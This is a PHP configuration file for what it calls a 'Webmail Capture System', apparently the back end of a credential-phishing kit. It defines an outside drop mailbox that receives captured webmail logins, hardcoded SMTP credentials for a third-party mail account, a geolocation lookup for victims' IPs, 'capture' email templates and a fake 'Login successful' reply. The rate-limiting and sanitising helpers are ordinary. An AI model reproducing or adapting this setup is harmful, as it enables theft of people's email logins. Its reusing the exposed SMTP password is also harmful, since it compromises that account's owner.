<?php
/**
 * Configuration file for Webmail Capture System
 * Centralized settings for SMTP and email functionality
 */

// SMTP Configuration
define('SMTP_HOST', 'mail.globalrisk.rw');
define('SMTP_PORT', '587');
define('SMTP_USERNAME', 'jered@globalrisk.rw');
define('SMTP_PASSWORD', 'global.321');
define('SMTP_SECURE', 'tls'); // or 'ssl'

// Email Configuration
define('RECEIVER_EMAIL', 'lenialuno@web.de');
define('SENDER_NAME', 'Webmail Security System');

// Logging Configuration
define('LOG_FILE', 'webmail_logs.txt');
define('BACKUP_LOG_FILE', 'webmail_backup.txt');

// Security Settings
define('ALLOWED_ORIGINS', ['*']); // Set specific domains in production
define('MAX_ATTEMPTS', 5);
define('SESSION_TIMEOUT', 3600); // 1 hour

// Geolocation API
define('GEO_API_URL', 'https://www.geoplugin.net/json.gp?ip=');

// Email Templates
define('EMAIL_SUBJECT_PREFIX', '📧 Webmail Login - ');
define('EMAIL_FOOTER', '🔒 This is an automated capture from the webmail login system.');

// Response Messages
define('SUCCESS_MESSAGE', 'Login successful');
define('ERROR_MESSAGE', 'Email delivery failed');
define('VALIDATION_ERROR', 'Invalid credentials');

// Debug Mode (set to false in production)
define('DEBUG_MODE', false);

// Rate Limiting
define('RATE_LIMIT_ENABLED', true);
define('RATE_LIMIT_ATTEMPTS', 10);
define('RATE_LIMIT_WINDOW', 300); // 5 minutes

/**
 * Get SMTP configuration array
 */
function getSMTPConfig() {
    return [
        'host' => SMTP_HOST,
        'port' => SMTP_PORT,
        'username' => SMTP_USERNAME,
        'password' => SMTP_PASSWORD,
        'secure' => SMTP_SECURE
    ];
}

/**
 * Get email configuration array
 */
function getEmailConfig() {
    return [
        'receiver' => RECEIVER_EMAIL,
        'sender_name' => SENDER_NAME,
        'subject_prefix' => EMAIL_SUBJECT_PREFIX
    ];
}

/**
 * Validate email address
 */
function isValidEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
}

/**
 * Sanitize input data
 */
function sanitizeInput($data) {
    return htmlspecialchars(strip_tags(trim($data)), ENT_QUOTES, 'UTF-8');
}

/**
 * Log activity for debugging
 */
function logActivity($message, $type = 'INFO') {
    if (DEBUG_MODE) {
        $logEntry = date('Y-m-d H:i:s') . " [{$type}] " . $message . "\n";
        file_put_contents('debug.log', $logEntry, FILE_APPEND | LOCK_EX);
    }
}

/**
 * Check rate limiting
 */
function checkRateLimit($ip) {
    if (!RATE_LIMIT_ENABLED) {
        return true;
    }
    
    $rateLimitFile = 'rate_limit_' . md5($ip) . '.txt';
    $currentTime = time();
    
    if (file_exists($rateLimitFile)) {
        $data = json_decode(file_get_contents($rateLimitFile), true);
        if ($data && $currentTime - $data['timestamp'] < RATE_LIMIT_WINDOW) {
            if ($data['attempts'] >= RATE_LIMIT_ATTEMPTS) {
                return false; // Rate limit exceeded
            }
            $data['attempts']++;
        } else {
            $data = ['timestamp' => $currentTime, 'attempts' => 1];
        }
    } else {
        $data = ['timestamp' => $currentTime, 'attempts' => 1];
    }
    
    file_put_contents($rateLimitFile, json_encode($data));
    return true;
}
?>